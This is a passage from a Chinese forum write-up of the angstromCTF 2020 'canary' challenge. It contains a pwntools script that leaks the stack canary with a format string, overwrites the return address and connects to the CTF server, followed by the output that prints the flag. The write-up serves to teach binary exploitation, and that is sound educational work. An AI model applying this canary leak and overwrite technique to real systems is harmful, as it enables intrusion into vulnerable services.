
`leave`指令执行完成后，栈中就只剩下`return`的地址了，由此得出溢出的位置在第73个字节处，为了方便我将栈中所有的位置都覆盖成了`canary`的值

```
from pwn import *



#sh=process('./canary')

sh=remote("shell.actf.co",20701)

#context.terminal=["/usr/bin/tmux","split-window","-h"]                             

#gdb.attach(sh)

sh.recvuntil("Hi! What's your name?")

sh.sendline("%17$lx abc")

canary=sh.recvuntil("abc")

canary=int(canary[19:35],16)

payload=p64(canary)*9

payload+=p64(0x400787)

sh.recvuntil("Anything else you want to tell me?")

sh.sendline(payload)

sh.interactive()

```

执行结果如下

```
root@gavin:/home/gavin/angstromCTF2020# python3 ./canary.py 

[+] Opening connection to shell.actf.co on port 20701: Done

[*] Switching to interactive mode

 actf{youre_a_canary_killer_>:(}

Segmentation fault

[*] Got EOF while reading in interactive

$ 

```

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于  2020-3-19 11:06

被pureGavin编辑

，原因： 信息不全

上传的附件：

- [canary](javascript:void(0);)

  （12.40kb，14次下载）
